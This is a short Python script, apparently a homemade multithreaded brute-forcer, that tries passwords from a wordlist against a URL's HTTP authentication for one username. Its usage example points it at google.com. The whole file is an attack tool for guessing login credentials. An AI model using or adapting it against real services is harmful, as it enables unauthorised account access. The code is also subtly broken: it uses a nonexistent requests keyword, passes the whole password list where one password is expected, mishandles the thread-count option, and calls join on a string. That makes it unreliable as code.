#!/usr/bin/python
import requests
from threading import Thread
import sys
import getopt
global hit
hit = "1"


def banner():
    # function to print banner for tool
    print("##################################")
    print("|                                |")
    print("|       BASIC BRUTEFORCER        |")
    print("|                                |")
    print("##################################")
    print("\n")


def usage():

    print("[~] USAGE ")
    print("         -u : URL to be bruteforce")
    print("         -U : single username")
    print("         -P : path to file or file containing passwords")
    print("         -t : number of threads to be run")
    print("[~] Example : ./bruteforcer.py -u https://google.com -U admin -P pass.txt -t 5 ")


class RequestPerformer(Thread):

    def __init__(self, name, user, url):
        Thread.__init__(self)
        self.password = name.split("\n")[0]
        self.username = user
        self.url = url
        print("*" + self.password + "*")

    def run(self):
        global hit
        if hit == "1":
            try:
                r = requests.get(self.url, authentication=(self.username, self.password))
                if r.status_code == 200:
                    hit = "0"
                    print(f"[+] Password found : {self.password}")
                    sys.exit()
                else:
                    print(f"[-] {self.password}  --> password is not valid ")
                    i[0] = i[0] - 1
            except Exception as t:
                print(f"[-] Error : {t}")


def start(argv):

    global password, thread, user, url
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, arge = getopt.getopt(argv, "u:U:P:t")
    except Exception as k:
        print(f"[-] Error : {k}")
        sys.exit()

    for opt, arg in opts:
        if opt == "-u":
            url = arg
        elif opt == "-U":
            user = arg
        elif opt == "-P":
            password = arg
        elif opt == "-t":
            thread = arg

    try:
        file = open(password, "r")
        passwords = file.readlines()
    except Exception as g:
        print(f"[-] Error : {g}")
        sys.exit()

    launch_thread(passwords, thread, user, url)


def launch_thread(passw, threads, users, link):

    global i
    i = []
    i.append(0)
    while len(passw):
        if hit == "1":
            try:
                if i[0] < threads:
                    pwd = passw.pop()
                    i[0] = i[0] + 1
                    thread1 = RequestPerformer(passw, users, link)
                    thread1.start()
            except Exception as f:
                print(f"[-] Error : {f}")
                sys.exit()
            threads.join()


if __name__ == "__main__":

    try:
        start(sys.argv[1:])
    except Exception as e:
        print(f"[-] Interrupted: {e}")
